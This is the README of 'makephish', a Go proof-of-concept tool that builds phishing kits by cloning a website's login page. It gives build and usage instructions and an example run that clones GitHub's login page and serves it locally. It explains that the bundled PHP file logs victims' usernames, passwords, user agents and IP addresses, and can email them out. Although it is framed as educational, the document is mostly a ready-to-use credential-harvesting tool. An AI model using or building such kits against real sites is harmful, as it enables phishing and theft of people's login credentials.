# makephish

<p align="center">
![makephish](https://github.com/andpalmier/makephish/blob/main/img/makephish.png?raw=true)
<p align="center">
<a href="https://github.com/andpalmier/makephish/blob/master/LICENSE"><img alt="Software License" src="https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square"></a>
<a href="https://goreportcard.com/report/github.com/andpalmier/makephish"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/andpalmier/goransom?style=flat-square"></a>
<a href="https://x.com/intent/follow?screen_name=andpalmier"><img src="https://img.shields.io/x/follow/andpalmier?style=social&logo=x" alt="follow on X"></a>
</p>
</p>

`makephish` is a proof of concept tool designed to automate the creation of phishing kits based on a specified URL. It works exclusively with websites featuring simple login pages using HTML `<form>` elements.

The primary objective of this project is educational. It was created to gain familiarity with Go programming. Consequently, the code may lack optimal organization and quality. Additionally, this project aims to illustrate the ease with which a website can be cloned and repurposed to create phishing pages.

## Installation

After cloning the repository, navigate to the project directory and build the executable:

```sh
go build -o makephish cmd/makephish/*.go
```

This will create an executable called `makephish`. You can run the executable with the following flags:

## Usage

- `-url`: URL of login page
- `-ua`: User Agent string, by defefault *"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"*
- `-php`: Path to the PHP file to be used, by default *"phish.php"*
- `-kits`: Path used to store the kits, by default *"./kits"*


### Example

```sh
$ ./makephish -url "https://github.com/login/"

           _           _   _     _
 _____  __| |_ ___ ___| |_|_|___| |_
|     ||. | '_| -_| . |   | |_ -|   |
|_|_|_|___|_|_|___|  _|_|_|_|___|_|_|
                  |_|


Navigating to https://github.com/login using the following User agent string: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Parameters found in the form of the given URL:
 - post action = /session
 - login attribute name = login
 - password attribute name = password
HTML file patched and saved in kits/github.com
PHP file saved in kits/github.com

[*] operation completed! kit created for https://github.com/login and saved in kits/github.com

$ tree kits/github.com
kits/github.com
├── assets
│   ├── behaviors-afe1a202.js
│   ├── chunk-frameworks-81b94425.js
│   ├── chunk-vendor-4d97ead9.js
│   ├── environment-f0adafbf.js
│   ├── frameworks-052cbe13e4b93c9b8358a7178885c1a0.css
│   ├── github-f19f9fd1ee83046f59cf1815d967f4d0.css
│   ├── sessions-45084fea.js
│   ├── settings-c44d66a8.js
│   ├── site-ca634d80a8a0df2203c34902267667dc.css
│   └── unsupported-a85b1284.js
├── index.html
└── phish.php

1 directory, 12 files

$ cd kits/github.com
$ php -S localhost:8000
[Sun Jan 10 12:10:54 2021] PHP 7.4.14 Development Server (http://localhost:8000) started
```

At this point, if you go to `localhost:8000` you should find something like this:

![fakeGH](https://github.com/andpalmier/makephish/blob/main/img/fakeGH.jpg?raw=true)

If you enter some random credentials, you will note that you will be redirected to the original login page provided:

![realGH](https://github.com/andpalmier/makephish/blob/main/img/realGH.jpg?raw=true)

If you didn't modify the `phish.php` file, you can find the credentials you just entered in `localhost:8000/log`:

![logs](https://github.com/andpalmier/makephish/blob/main/img/logs.jpg?raw=true)

### PHP capabilities

A simple PHP file is provided in this repo, but you can easily adjust it to your needs. By default, the file will save username, password, User Agent string, and IP of the victim in a log file. You can disable this option by removing the content of the variable `log`. You can also specify an email address to send these details via email every time a new victim enters the credentials.
```
$exfilemail = ""; // -> enter an email address to send the details via email
$logpath = "log"; // -> make this variable empty to disable logging feature
```
